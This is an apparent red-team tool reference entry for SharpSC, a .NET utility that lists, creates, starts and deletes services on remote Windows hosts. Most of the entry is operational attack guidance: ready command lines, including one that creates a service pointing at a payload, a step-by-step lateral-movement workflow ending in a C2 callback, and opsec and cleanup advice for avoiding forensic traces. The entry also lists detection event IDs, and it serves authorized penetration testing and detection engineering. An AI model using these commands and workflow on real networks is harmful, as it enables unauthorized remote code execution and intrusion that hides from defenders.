---
name: SharpSC
category: lateral-movement
subcategories: [service-control, remote-service-management, scm-lateral]
tradecraft_tags: [service, scm, remote-management, lateral-movement, dotnet, apollo-runnable]
mitre_attack:
  - id: T1021.002
    name: Remote Services — SMB/Windows Admin Shares
  - id: T1543.003
    name: Create or Modify System Process — Windows Service
source:
  url: https://github.com/djhohnstein/SharpSC
  license: Unknown
  maintained: false
binary_type: .net-assembly
binary_filename: SharpSC.exe
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  Service control operations on remote hosts via SCM generate authentication events
  (Event 4624 type 3), service creation (Event 7045), and service modification
  (Event 7040) events on the target. Service start/stop generates Event 7036.
usage_examples:
  - description: List services on a remote host
    args: "SharpSC.exe action=list computername=192.168.56.22"
  - description: Start a service on a remote host
    args: "SharpSC.exe action=start computername=192.168.56.22 service=wuauserv"
  - description: Create a remote service for lateral movement
    args: "SharpSC.exe action=create computername=192.168.56.22 service=UpdateAgent binpath='C:\\Windows\\Temp\\payload.exe'"
  - description: Delete a created service (cleanup)
    args: "SharpSC.exe action=delete computername=192.168.56.22 service=UpdateAgent"
opsec_notes: |
  Remote service creation via SCM is well-detected (Event 7045 is a standard forensic
  artifact). Service-based lateral movement is one of the highest-signal approaches.
  Use only when other methods (WMI, WinRM) are unavailable or blocked. Cleanup is critical.
gotchas: |
  Service creation requires admin on the remote host AND SMB access to ADMIN$.
  Creating a service with a binary that doesn't exist generates a service start failure
  visible in event logs. Always upload the binary first, THEN create and start the service.
  Clean up: stop → delete service, delete binary. Not actively maintained.
related_ttps: [sharpexec, sharpmove, sharpwmi, crackmapexec]
alternatives: [sharpexec-smbexec, impacket-svcexec, crackmapexec]
common_args:
  action:
    description: Action to perform
    typical_values: [list, start, stop, create, delete]
    required: true
  computername:
    description: Remote target
    typical_values: ["192.168.56.22", "WINTERFELL"]
    required: true
  service:
    description: Service name
    typical_values: ["UpdateAgent", "WinMgmt"]
  binpath:
    description: Binary path for service creation
    typical_values: ["C:\\\\Windows\\\\Temp\\\\payload.exe"]
last_updated: 2026-05-29
---

# SharpSC

A .NET assembly for remote Service Control Manager (SCM) operations — list, create,
start, stop, and delete services on remote Windows hosts. Apollo-compatible via
inline_assembly. Service-based lateral movement is high-signal; prefer WMI or WinRM
when available.

## Typical use cases
- Remote service creation and execution for lateral movement (last resort)
- Start/stop services on remote hosts for persistence or troubleshooting
- Enumerate services on a target before other operations

## Lateral Movement via Service Creation

```
1. Upload payload to target (via Apollo download, Mythic, or impacket-smbserver)
2. Create service: SharpSC create computername=TARGET service=WinAgent binpath='C:\Windows\Temp\payload.exe'
3. Start service: SharpSC start computername=TARGET service=WinAgent
4. Service executes payload → C2 callback
5. Cleanup: SharpSC stop → delete → delete file
```
